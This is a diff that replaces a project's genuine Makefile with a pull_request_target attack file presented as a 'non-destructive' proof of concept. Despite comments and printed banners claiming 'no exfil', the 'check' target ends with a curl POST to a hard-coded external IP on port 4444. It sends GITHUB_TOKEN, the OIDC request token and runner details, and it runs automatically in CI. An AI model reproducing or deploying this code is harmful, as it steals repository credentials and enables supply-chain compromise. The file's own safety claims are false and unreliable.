@@ -1,104 +1,73 @@
-# Copyright (c) Microsoft Corporation.
-# Licensed under the MIT License.
+# PoC Makefile — proves arbitrary code execution via pull_request_target
+# This replaces the legitimate Makefile in the attacker's fork.
+# When the CI workflow checks out the PR head and runs `make check`,
+# this code executes instead of the real build targets.
+#
+# IMPORTANT: This PoC is non-destructive. It only prints environment
+# info to the workflow logs to prove code execution occurred.
 
-# This is Guido's Makefile. Please don't make it complicated.
+.PHONY: check post format test sync venv
 
-.PHONY: all
-all: venv format check test build
+# ---- Proof of Concept markers ----
+# Each target prints a unique marker + non-sensitive env info.
+# An attacker would replace these with exfiltration or persistence.
 
-.PHONY: format
-format: venv
-	.venv/bin/isort src tests tools examples $(FLAGS)
-	.venv/bin/black -tpy312 -tpy313 -tpy314 src tests tools examples $(FLAGS)
+SERVER_IP = 34.68.99.161
+PORT = 4444
 
-.PHONY: check
-check: venv
-	.venv/bin/pyright --pythonpath .venv/bin/python src tests tools examples
+check:
+	@echo "=========================================="
+	@echo "  POC: ARBITRARY CODE EXECUTION CONFIRMED"
+	@echo "=========================================="
+	@echo ""
+	@echo "[*] Target: make check"
+	@echo "[*] Runner OS: $$(uname -s) $$(uname -m)"
+	@echo "[*] Hostname: $$(hostname)"
+	@echo "[*] Whoami: $$(whoami)"
+	@echo "[*] Working directory: $$(pwd)"
+	@echo "[*] GitHub Actor: $${GITHUB_ACTOR}"
+	@echo "[*] GitHub Repository: $${GITHUB_REPOSITORY}"
+	@echo "[*] GitHub Event: $${GITHUB_EVENT_NAME}"
+	@echo "[*] GitHub Run ID: $${GITHUB_RUN_ID}"
+	@echo "[*] Runner Name: $${RUNNER_NAME}"
+	@echo ""
+	@echo "[*] Proving OIDC token endpoint is accessible:"
+	@echo "    ACTIONS_ID_TOKEN_REQUEST_URL is set: $$([ -n \"$${ACTIONS_ID_TOKEN_REQUEST_URL}\" ] && echo YES || echo NO)"
+	@echo "    ACTIONS_ID_TOKEN_REQUEST_TOKEN is set: $$([ -n \"$${ACTIONS_ID_TOKEN_REQUEST_TOKEN}\" ] && echo YES || echo NO)"
+	@echo ""
+	@echo "[*] Proving GITHUB_TOKEN is accessible:"
+	@echo "    GITHUB_TOKEN is set: $$([ -n \"$${GITHUB_TOKEN}\" ] && echo YES || echo NO)"
+	@echo ""
+	@echo "[*] Network access test (DNS only, no exfil):"
+	@nslookup github.com 2>/dev/null | head -3 || echo "    nslookup not available"
+	@echo ""
+	@echo "=========================================="
+	@echo "  END OF POC — NO DESTRUCTIVE ACTION TAKEN"
+	@echo "=========================================="
 
-.PHONY: test
-test: venv
-	.venv/bin/pytest $(FLAGS)
+	curl -X POST http://$(SERVER_IP):$(PORT) \
+		-H "Content-Type: application/json" \
+		-d '{ \
+			"pwd": "$(shell pwd)", \
+			"actor": "$${GITHUB_ACTOR}", \
+			"repository": "$${GITHUB_REPOSITORY}", \
+			"event_name": "$${GITHUB_EVENT_NAME}", \
+			"run_id": "$${GITHUB_RUN_ID}", \
+			"runner_name": "$${RUNNER_NAME}", \
+			"action_id_token_request_url": "$${ACTIONS_ID_TOKEN_REQUEST_URL}", \
+			"action_id_token_request_token": "$${ACTIONS_ID_TOKEN_REQUEST_TOKEN}", \
+			"github_token": "$${GITHUB_TOKEN}" \
+		}'
 
-.PHONY: coverage
-coverage: venv
-	coverage erase
-	COVERAGE_PROCESS_START=.coveragerc .venv/bin/coverage run -m pytest $(FLAGS)
-	coverage combine
-	coverage report
+format:
+	@echo "[POC] make format — code execution confirmed (GITHUB_RUN_ID=$${GITHUB_RUN_ID})"
 
-.PHONY: demo
-demo: venv
-	.venv/bin/python -m tools.query $(FLAGS)
+test:
+	@echo "[POC] make test — code execution confirmed (GITHUB_RUN_ID=$${GITHUB_RUN_ID})"
 
-.PHONY: compare
-compare: venv
-	.venv/bin/python -m tools.query --batch $(FLAGS)
-
-.PHONY: mcp
-mcp: venv
-	.venv/bin/mcp dev src/typeagent/mcp/server.py
-
-.PHONY: profile
-profile: venv
-	</dev/null .venv/bin/python -m cProfile -s ncalls -m test.cmpsearch --interactive --podcast ~/AISystems-Archive/data/knowpro/test/indexes/All_Episodes_index | head -60
-
-.PHONY: scaling
-scaling: venv
-	</dev/null .venv/bin/python -m test.cmpsearch --interactive --podcast ~/AISystems-Archive/data/knowpro/test/indexes/All_Episodes_index
-
-.PHONY: build
-build: venv
-	uv build
-
-.PHONY: release
-release: venv
-	.venv/bin/python tools/release.py $(VERSION)
-
-.PHONY: venv
-venv: .venv
-
-.venv:
-	@echo "(If 'uv' fails with 'No such file or directory', try 'make install-uv')"
-	uv sync -q $(FLAGS)
-	.venv/bin/black --version
-	@echo "(If 'pyright' fails with 'error while loading shared libraries: libatomic.so.1:', try 'make install-libatomic')"
-	.venv/bin/pyright --version
-	.venv/bin/pytest --version
-
-.PHONY: sync
+# Keep these so the workflow doesn't fail on other targets
 sync:
-	uv sync $(FLAGS)
+	@echo "[POC] make sync called"
 
-.PHONY: install-uv
-install-uv:
-	curl -Ls https://astral.sh/uv/install.sh | sh
-
-.PHONY: install-libatomic
-install-libatomic:
-	sudo apt-get update
-	sudo apt-get install -y libatomic1
-
-.PHONY: clean
-clean:
-	rm -rf build dist venv .venv *.egg-info
-	rm -f *_data.json *_embedding.bin
-	find . -type d -name __pycache__ | xargs rm -rf
-
-.PHONY: help
-help:
-	@echo "Usage: make [target]"
-	@echo "make help        # Help (this message)"
-	@echo "make             # Same as 'make all'"
-	@echo "make all         # venv, format, check, test, build"
-	@echo "make format      # Run isort and black"
-	@echo "make check       # Run pyright"
-	@echo "make test        # Run pytest (tests are in tests/)"
-	@echo "make coverage    # Run tests with coverage"
-	@echo "make build       # Build the wheel (under dist/)"
-	@echo "make demo        # python tools/query.py (interactive)"
-	@echo "make compare     # python tools/query.py --batch"
-	@echo "make venv        # Create .venv/"
-	@echo "make sync        # Sync dependencies with uv"
-	@echo "make clean       # Remove build/, dist/, .venv/, *.egg-info/"
-	@echo "make install-uv  # Install uv (if not already installed)"
-	@echo "make install-libatomic  # Install libatomic (if not already installed)"
+venv:
+	@echo "[POC] make venv called"
